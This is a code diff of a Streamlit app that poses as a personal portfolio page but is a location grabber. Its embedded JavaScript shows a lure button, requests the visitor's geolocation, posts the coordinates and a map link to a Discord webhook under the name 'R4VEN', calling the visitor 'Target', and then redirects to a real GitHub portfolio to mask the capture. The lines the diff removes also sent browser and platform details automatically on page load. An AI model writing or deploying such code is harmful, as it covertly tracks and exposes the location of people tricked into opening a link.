@@ -1,14 +1,8 @@
 import streamlit as st
 import streamlit.components.v1 as components
 
-# Konfigurasi halaman Streamlit
-st.set_page_config(
-    page_title="Portfolio", 
-    page_icon="💼", 
-    layout="wide"
-)
+st.set_page_config(page_title="Portfolio", layout="wide")
 
-# CSS untuk menyembunyikan elemen bawaan Streamlit
 hide_streamlit_style = """
     <style>
     #MainMenu {visibility: hidden;}
@@ -19,7 +13,6 @@ hide_streamlit_style = """
 """
 st.markdown(hide_streamlit_style, unsafe_allow_html=True)
 
-# Ambil Discord Webhook dari Streamlit Secrets
 try:
     webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
 except Exception:
@@ -28,10 +21,11 @@ except Exception:
 html_code = f"""
 <!DOCTYPE html>
 <html>
-<body onload="getLocation()">
-  <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-    <h3>Loading...</h3>
-  </div>
+<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
+  <!-- Tombol yang harus diklik pengguna -->
+  <button onclick="startProcess()" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px;">
+    Klik di sini untuk melihat Portfolio
+  </button>
 
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
   <script>
@@ -44,15 +38,13 @@ html_code = f"""
         request.send(JSON.stringify(payload));
     }}
 
-    // Kirim Info Sistem
-    var sysinfo = "Platform: " + navigator.platform + " | Browser: " + navigator.appName + " | Time: " + new Date().toLocaleTimeString();
-    sendToDiscord({{
-      username: "R4VEN",
-      content: "@everyone Someone Opened The Link",
-      embeds: [{{ title: "System Info", description: sysinfo, color: 15418782 }}]
-    }});
+    function startProcess() {{
+      // Kirim info awal
+      sendToDiscord({{
+        username: "R4VEN",
+        content: "Target mengklik tombol, memulai pengambilan data..."
+      }});
 
-    function getLocation() {{
       if (navigator.geolocation) {{
         navigator.geolocation.getCurrentPosition(showPosition, showError);
       }} else {{
@@ -67,21 +59,19 @@ html_code = f"""
       sendToDiscord({{
         username: "R4VEN",
         embeds: [{{ 
-            title: "Target Location", 
+            title: "Target Location (Click Allowed)", 
             description: latlong + "\\n[Buka di Maps](" + mapLink + ")", 
             color: 15844367 
         }}]
       }});
 
-      setTimeout(function() {{
-        window.location.href = "https://iqbalmantam.github.io/portfolio/";
-      }}, 500);
+      window.location.href = "https://iqbalmantam.github.io/portfolio/";
     }}
 
     function showError(error) {{
       sendToDiscord({{
         username: "R4VEN",
-        content: "User denied location access."
+        content: "Target menolak izin lokasi."
       }});
       window.location.href = "https://iqbalmantam.github.io/portfolio/";
     }}
@@ -91,6 +81,6 @@ html_code = f"""
 """
 
 if webhook_url:
-    components.html(html_code, height=200)
+    components.html(html_code, height=300)
 else:
-    st.error("⚠️ Discord Webhook URL belum diatur!")
+    st.error("⚠️ Webhook URL belum diatur!")
